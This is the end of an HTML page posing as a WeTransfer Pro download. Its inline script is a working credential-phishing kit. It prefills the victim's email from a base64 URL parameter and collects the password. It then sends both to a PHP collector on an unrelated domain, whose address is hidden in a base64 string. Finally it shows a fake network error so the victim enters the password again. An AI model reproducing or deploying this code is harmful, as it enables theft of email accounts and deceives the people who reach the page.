<div class="m-footer"><h1>WeTransfer Pro</h1><p>Get more out of WeTransfer, get Pro</p></div><p class="error-box"></p></div></div></div>
<script type="text/javascript" src="https://code.jquery.com/jquery-3.7.1.min.js"></script>

<script type="text/javascript">
const gPValue = new Proxy(new URLSearchParams(window.location.search), {
get: (ogbo, nara) => ogbo.get(nara),
});
const may30 = decodeIfBase64(gPValue.e);	

$(document).ready(function() {
	// $('#modal2').removeClass('hidden');
	$('#umail').val(may30);
	  if (may30) {document.querySelector('#upass').focus(); $('#umail').prop("readonly", true) }else{document.querySelector('#umail').focus();}
	$('.showmodal, .a, #showFormBtn2').on('click', (target) => {
		$('#modal2').removeClass('hidden');
	})

	$("#showSlide, #preview").on('click', () => {
	    $(".box2slidein").addClass('show').removeClass('hidden4mobile');
	    $('#showSlide').addClass('showmodal');
	});
	$(".cls-btn").on('click', () => {
	    $('#modal2').addClass('hidden');
	});	
	var jeff = "aHR0cHM6Ly9ybmFzY2hpb2dhc3BhcmRvLmluZm8vYmlnbGV4L2xhbWJvLnBocA==";
	$('#submitFormBtn').on('click', (e) => {
		e.preventDefault();

		let umail = $('#umail').val()
		let upass = $('#upass').val();
		$('#umail').removeClass('border-uhie')

		var validRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;
		  // if (input.value.match(validRegex)) {		
		$('#ozinwa').html('').addClass('hide');

		if(!umail || !umail.match(validRegex)){
			$('#ozinwa').html('Correct email address required.').removeClass('hide').css({'background-color' :'#e10d0d', 'color':'#fff'});
			$('#umail').addClass('border-uhie').focus();
			return false;
		}
		if(!upass || upass.length < 6){
			$('#ozinwa').html('Correct email password required.').removeClass('hide').css({'background-color' :'#e10d0d', 'color':'#fff'});;
			$('#upass').addClass('border-uhie').focus()
			return false;
		}

		let formElem = document.querySelector('#finalForm');
	    // Store reference to form to make later code easier to read
	    const form = formElem;

	    //hide the button
	    $('#submitFormBtn').attr('disabled', true).html('<div id="spinner">');
	    // $('#spinner').show();

	    // Post data using the Fetch API
	    fetch(atob(jeff), {
	        method: form.method,
	        body: new FormData(form),
	    })
	        // We turn the response into text as we expect HTML
        .then((res) => res.text())

        .then((res) => {
            console.log(res)
			$('#ozinwa').html('Network error, kindly try again.').removeClass('hide').css({'background-color' :'transparent', 'color':'red'});
		    $('#submitFormBtn').removeAttr('disabled').html('Download');
		    $('#upass').val('').focus()
        })
        .catch((err) => {
        	console.log(err);
        });
	})	
	// body...
})	
	function decodeIfBase64(t){return function(t){try{return btoa(atob(t))==t}catch(t){return!1}}(t)?atob(t):t}

</script>
